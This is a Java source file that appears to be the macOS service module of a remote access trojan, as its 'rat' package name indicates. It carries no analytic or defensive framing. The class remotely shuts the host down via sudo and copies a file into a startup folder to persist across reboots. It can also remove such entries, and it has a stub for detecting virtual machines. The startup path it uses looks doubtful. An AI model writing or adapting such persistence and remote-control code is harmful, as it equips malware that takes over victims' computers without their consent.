package de.sogomn.rat.service;

import java.io.File;

import de.sogomn.engine.util.FileUtils;

public final class MacService implements IOperatingSystemService {
	
	private static final String SHUTDOWN_COMMAND = "sudo shutdown -h now";
	private static final String STARTUP_DIRECTORY_PATH ="Macintosh HD" + File.separator + "Library" + File.separator + "Startup";
	
	MacService() {
		//...
	}
	
	@Override
	public void shutDown() {
		try {
			Runtime.getRuntime().exec(SHUTDOWN_COMMAND);
		} catch (final Exception ex) {
			ex.printStackTrace();
		}
	}
	
	@Override
	public void addToStartup(final File file) {
		final String path = STARTUP_DIRECTORY_PATH + File.separator + file.getName();
		final File destination = new File(path);
		
		FileUtils.copyFile(file, destination);
	}
	
	@Override
	public void removeFromStartup(final String name) {
		final String path = STARTUP_DIRECTORY_PATH + File.separator + name;
		final File file = new File(path);
		
		file.delete();
	}
	
	public boolean isVm() {
		return false;
	}
	
}